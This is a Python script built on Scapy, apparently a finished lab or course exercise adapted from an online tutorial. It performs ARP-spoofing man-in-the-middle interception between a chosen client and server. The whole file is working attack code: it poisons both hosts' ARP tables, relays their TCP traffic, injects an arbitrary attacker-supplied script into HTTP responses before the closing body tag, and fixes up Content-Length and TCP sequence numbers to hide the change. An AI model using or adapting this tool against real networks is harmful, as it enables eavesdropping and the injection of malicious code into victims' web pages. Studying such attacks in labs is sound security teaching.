# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

_mac_cache = {}

offsets = {}

buffers = {}


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    cached = _mac_cache.get(IP)
    if cached:
        return cached
    
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
    ans = srp1(pkt, timeout=1, verbose=0, iface=conf.iface)

    if ans and ARP in ans:
        mac_addr = ans[ARP].hwsrc
    else:
        mac_addr = getmacbyip(IP)
    
    if mac_addr:
        _mac_cache[IP] = mac_addr

    return mac_addr

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    packet = ARP(op=2, pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC)
    send(packet, verbose=0, iface=conf.iface)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    packet = ARP(op=2, pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC)
    send(packet, verbose=0, count=3, iface=conf.iface)

# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward

def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, offsets, buffers

    if packet[Ether].src == attackerMAC:
        return

    if packet.haslayer(IP) and packet.haslayer(TCP):
        pkt_src = packet[IP].src
        
        if pkt_src == clientIP:
            client_port = packet[TCP].sport
            server_port = packet[TCP].dport
            direction = "CtoS"
        elif pkt_src == serverIP:
            server_port = packet[TCP].sport
            client_port = packet[TCP].dport
            direction = "StoC"
        else:
            return

        conn_key = (client_port, server_port)

        if conn_key not in offsets:
            offsets[conn_key] = 0
            buffers[conn_key] = b""
        
        current_offset = offsets[conn_key]

        if direction == "CtoS":
            if current_offset != 0:
                new_ack = (packet[TCP].ack - current_offset) % 4294967296
                packet[TCP].ack = new_ack
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum

            packet[Ether].src = attackerMAC
            packet[Ether].dst = serverMAC
            sendp(packet, iface=conf.iface, verbose=0)

        elif direction == "StoC":
            if current_offset != 0:
                new_seq = (packet[TCP].seq + current_offset) % 4294967296
                packet[TCP].seq = new_seq
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum

            if packet.haslayer(Raw):
                payload = packet[Raw].load
                original_len = len(payload)
                modified = False
                
                injection = f"<script>{script}</script>".encode('utf-8')
                injection_len = len(injection)

                if b'Content-Length:' in payload:

                    m = re.search(b'Content-Length: \s*(\d+)', payload)
                    if m:
                        old_len = int(m.group(1))
                        new_len = old_len + injection_len
                        
                        new_header = f"Content-Length: {new_len}".encode('utf-8')
                        
                        payload = re.sub(b'Content-Length: \s*\d+', new_header, payload, count=1)
                        modified = True

                if b'</body>' in payload:
                    new_payload = payload.replace(b'</body>', injection + b'</body>')
                    payload = new_payload
                    modified = True

                if modified:
                    packet[Raw].load = payload
                    diff = len(payload) - original_len
                    offsets[conn_key] += diff
                    
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[TCP].chksum
                
                packet[Ether].src = attackerMAC
                packet[Ether].dst = clientMAC
                
                ip_header_len = packet[IP].ihl * 4
                tcp_header_len = packet[TCP].dataofs * 4
                max_payload_space = 1500 - ip_header_len - tcp_header_len
                
                full_payload = packet[Raw].load

                if len(full_payload) > max_payload_space:

                    split_at = max_payload_space
                    chunk1 = full_payload[:split_at]
                    chunk2 = full_payload[split_at:]

                    pkt1 = packet.copy()
                    pkt1[Raw].load = chunk1

                    del pkt1[IP].len
                    del pkt1[IP].chksum
                    del pkt1[TCP].chksum

                    sendp(pkt1, iface=conf.iface, verbose=0)

                    pkt2 = packet.copy()
                    pkt2[Raw].load = chunk2
                    pkt2[TCP].seq = (pkt1[TCP].seq + len(chunk1)) % 4294967296

                    del pkt2[IP].len
                    del pkt2[IP].chksum
                    del pkt2[TCP].chksum

                    sendp(pkt2, iface=conf.iface, verbose=0)
                else:
                    sendp(packet, iface=conf.iface, verbose=0)
            
            else:
                packet[Ether].src = attackerMAC
                packet[Ether].dst = clientMAC

                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                
                sendp(packet, iface=conf.iface, verbose=0)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    script = args.script
    

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor, 'store':0}, daemon=True)
    sniff_th.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
